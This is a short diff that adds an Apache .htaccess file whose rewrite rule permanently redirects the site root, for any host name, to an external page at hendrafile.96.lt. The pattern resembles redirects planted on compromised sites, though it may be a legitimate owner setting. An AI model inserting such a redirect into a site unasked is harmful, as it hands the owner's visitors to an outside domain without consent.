@@ -1,0 +1,7 @@
+
+RewriteOptions inherit
+
+RewriteEngine on
+RewriteCond %{HTTP_HOST} ^.*$
+RewriteRule ^/?$ "http\:\/\/hendrafile\.96.lt\/index\.html" [R=301,L]
+
